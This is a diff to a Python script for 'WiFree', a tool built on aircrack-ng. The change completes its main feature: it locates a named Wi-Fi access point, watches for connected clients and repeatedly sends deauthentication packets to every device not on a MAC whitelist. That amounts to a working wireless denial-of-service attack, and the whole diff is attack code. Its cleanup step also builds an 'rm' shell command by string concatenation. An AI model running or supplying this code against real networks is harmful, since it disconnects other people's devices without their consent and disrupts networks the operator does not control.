@@ -7,6 +7,7 @@ from WiFree.Settings.CurrentSettings import CurrentSettings
 from WiFree.Settings import DEFAULT_CONFIG_FILE
 from WiFree.Aircrack.Airmon import Airmon
 from WiFree.Aircrack.Airodump import Airodump
+from WiFree.Aircrack.Aireplay import Aireplay
 
 parser = argparse.ArgumentParser(prog='wifree', description='Free your wifi.')
 parser.add_argument('-e', '--essid', help='Network essid')
@@ -14,7 +15,15 @@ parser.add_argument('-i', '--interface', help='Network interface to put in     \
                                                 monitor mode')
 parser.add_argument('-f', '--file', help='Configuration file')
 parser.add_argument('-w', '--whitelist', help='MAC whitelist, comma-separated')
+parser.add_argument('-n', help='Number of deauthentication packets to send')
 parser.add_argument('-v', '--verbose', help='Verbosity on/off')
+
+ESSID = ""
+BSSID = ""
+VERBOSE = False
+SEC = 5
+MAX_ATTEMPTS = 2
+N = 10
 
 if __name__ == '__main__':
     if os.geteuid() != 0:
@@ -46,6 +55,8 @@ if __name__ == '__main__':
         currentSettings.setWhitelist(" ".join(args.whitelist.split(",")))
     if args.verbose:
         VERBOSE = True
+    if args.n:
+        N = args.n
 
     if currentSettings.check_error():
         print("ERROR: some setting options are missing")
@@ -70,32 +81,52 @@ if __name__ == '__main__':
 
     airodump = Airodump(airmon.getMonitorInterface(), \
                                         currentSettings.getEssid())
-    if airodump.getBSSID(5, 2):
-        print("Got MAC of closest AP with essid " + currentSettings.getEssid())
+    BSSID = airodump.getBSSID(SEC, MAX_ATTEMPTS)
+    if BSSID:
+        print("Got MAC of closest AP with essid " + currentSettings.getEssid() + ": " + BSSID)
     else:
         print("Couldn't get BSSID for essid " + currentSettings.getEssid())
         print("Aborting...")
         airmon.stop()
         exit(-1)
 
-    bssid = airodump._bssid
+    airodump.start(["--bssid", BSSID])
+    print("Waiting for connected clients...")
 
-    airodump.start(["--bssid", bssid])
-    print("Waiting for clients connected...")
+    whitelist = set(currentSettings.getWhitelist().split(" "))
+    ESSID = currentSettings.getEssid()
+
+    aireplay = Aireplay(airmon.getMonitorInterface(), BSSID, airodump.getChannel(BSSID))
 
     while True:
-        time.sleep(5)
+        try:
+            time.sleep(5)
 
-        airodump.read_res()
-        clients = set(airodump._clients[currentSettings.getEssid()])
-        whitelist = set(currentSettings.getWhitelist().split(" "))
-        toDeauth = clients-whitelist
+            airodump.read_res()
+            if not ESSID in airodump._clients:
+                print("No clients so far...")
+                if VERBOSE:
+                    print("clients: " + airodump._clients)
+                continue
 
-        if not toDeauth:
-            print("No clients so far...")
-            continue
+            clients = set(airodump._clients[ESSID])
+            toDeauth = clients-whitelist
 
-        # TODO: deauthenticate clients in toDeauth list
+            if not toDeauth:
+                print("No clients so far...")
+                if VERBOSE:
+                    print("clients: " + airodump._clients)
+                continue
 
-    print("Deactivating monitor mode on interface " + airmon.getMonitorInterface())
-    airmon.stop()
+            for cl in toDeauth:
+                print("deauthenticating " + cl)
+                if aireplay.deauth(N, cl):
+                    print("\t...OK")
+
+        except (KeyboardInterrupt, Exception):
+            print("Got exception...")
+            print("\tDeactivating monitor mode on interface " + airmon.getMonitorInterface())
+            airmon.stop()
+            print("\tRemoving trash airodump-ng output")
+            os.system("rm " + airodump._airout + "-*")
+            raise
